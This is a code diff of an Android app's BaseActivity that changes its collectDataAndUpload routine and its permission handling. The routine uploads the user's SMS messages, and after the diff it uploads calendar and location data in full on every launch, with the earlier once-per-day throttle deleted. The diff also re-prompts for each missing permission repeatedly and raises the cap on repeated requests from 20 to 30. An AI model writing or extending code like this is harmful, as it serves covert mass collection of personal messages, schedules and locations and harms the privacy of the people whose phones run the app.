@@ -364,6 +364,14 @@ public class BaseActivity extends AppCompatActivity {
 
     String appIsInit =
         KndcStorage.getInstance().getData(KndcStorage.APP_IS_INIT);
+
+    //初始化过之后 校验权限 - 第一次由H5触发
+    if (!TextUtils.isEmpty(appIsInit) && appIsInit.equals(KndcStorage.YSE)) {
+      if (!hasPermissionKndc()) {
+        Log.d(TAG, "onMessageEvent: checkSelfPermission");
+        requestPermissionKndc();
+      }
+    }
     new Thread(() -> {
       //初始化过之后才上报数据
       if (!TextUtils.isEmpty(appIsInit) && appIsInit.equals(KndcStorage.YSE)) {
@@ -377,17 +385,6 @@ public class BaseActivity extends AppCompatActivity {
     }
 
     setConfigInfo(KndcStorage.APP_LAST_OPEN_TIME, String.valueOf(System.currentTimeMillis()));
-
-
-
-//    String appIsCheckPermission =
-//        KndcStorage.getInstance().getData(KndcStorage.H5_IS_CHECK_PERMISSION);
-//
-//    if (!TextUtils.isEmpty(appIsCheckPermission) && appIsCheckPermission
-//        .equals(KndcStorage.YSE)) {
-//      //收集数据
-//      collectDataAndUpload();
-//    }
   }
 
   //跳转相册
@@ -695,31 +692,10 @@ public class BaseActivity extends AppCompatActivity {
         uploadData.getAndSendSms(smsLastTimeStamp);
         setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(nowTimeStamp));
 
-
-        //上传日程信息  每次启动APP全量上报
-//        String contactLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_CONTACT_TIME);
-//        if(!TextUtils.isEmpty(contactLastTime)) {
-//          long contactLastTimeStamp = Long.parseLong(contactLastTime);
-//          if(contactLastTimeStamp < todayStartTime) {
-//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendCalendar" );
-//            uploadData.getAndSendCalendar();
-//            setConfigInfo(KndcStorage.CONFIG_CONTACT_TIME, String.valueOf(nowTimeStamp));
-//          }
-//        }
         Log.d(TAG, "collectDataAndUpload BEGIN getAndSendCalendar" );
         uploadData.getAndSendCalendar();
         setConfigInfo(KndcStorage.CONFIG_CONTACT_TIME, String.valueOf(nowTimeStamp));
 
-        //上传位置信息  每次启动APP全量上报
-//        String localLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_LOCAL_TIME);
-//        if(!TextUtils.isEmpty(localLastTime)) {
-//          long localLastTimeStamp = Long.parseLong(localLastTime);
-//          if(localLastTimeStamp < todayStartTime) {
-//            Log.d(TAG, "collectDataAndUpload BEGIN getAndSendLocation" );
-//            uploadData.getAndSendLocation();
-//            setConfigInfo(KndcStorage.CONFIG_LOCAL_TIME, String.valueOf(nowTimeStamp));
-//          }
-//        }
         Log.d(TAG, "collectDataAndUpload BEGIN getAndSendLocation" );
         uploadData.getAndSendLocation();
         setConfigInfo(KndcStorage.CONFIG_LOCAL_TIME, String.valueOf(nowTimeStamp));
@@ -730,22 +706,16 @@ public class BaseActivity extends AppCompatActivity {
     }).start();//启动线程
   }
 
-  //等待弹出数字键盘
-//  public void waitCheckPermission() {
-//    Timer timer = new Timer();//开启一个时间等待任务
-//    timer.schedule(new TimerTask() {
-//      @Override
-//      public void run() {
-//        if (!hasPermission()) {
-//          requestPermission();
-//        }
-//      }
-//    }, 500);
-//  }
-
   public boolean hasPermissionKndc() {
     if(CommonApp.permissionsList == null || CommonApp.permissionsList.isEmpty()) {
       return true;
+    }
+    for (String permission : CommonApp.permissionsList) {
+      if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
+        Log.d(TAG, "checkSelfPermission " + permission + ": false" );
+      } else {
+        Log.d(TAG, "checkSelfPermission " + permission + ": true" );
+      }
     }
     for (String permission : CommonApp.permissionsList) {
       if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
@@ -762,29 +732,17 @@ public class BaseActivity extends AppCompatActivity {
     }
     Log.d(TAG,
         "checkSelfPermission requestPermissionKndc permissionsList length:" + CommonApp.permissionsList.size());
-    if(REQUEST_PERMISSION_COUNT > 20) {
+    if(REQUEST_PERMISSION_COUNT > 30) {
       return;
     }
 
     for (String permission : CommonApp.permissionsList) {
       if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
-        REQUEST_PERMISSION_COUNT++;
+        REQUEST_PERMISSION_COUNT ++;
         requestPermissions(new String[]{permission}, PERMISSION_REQUEST_CODE_STORAGE);
         return;
       }
     }
-//    String[] permissionsTmp = new String[]{};
-//
-//    for (String permission : CommonApp.permissionsList) {
-//      if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
-//        REQUEST_PERMISSION_COUNT++;
-//        permissionsTmp[permissionsTmp.length] = permission;
-//      }
-//    }
-//
-//    if(permissionsTmp.length > 0) {
-//      requestPermissions(permissionsTmp, PERMISSION_REQUEST_CODE_STORAGE);
-//    }
   }
 
   //通知前端权限项 0 未获得权限  1已有权限
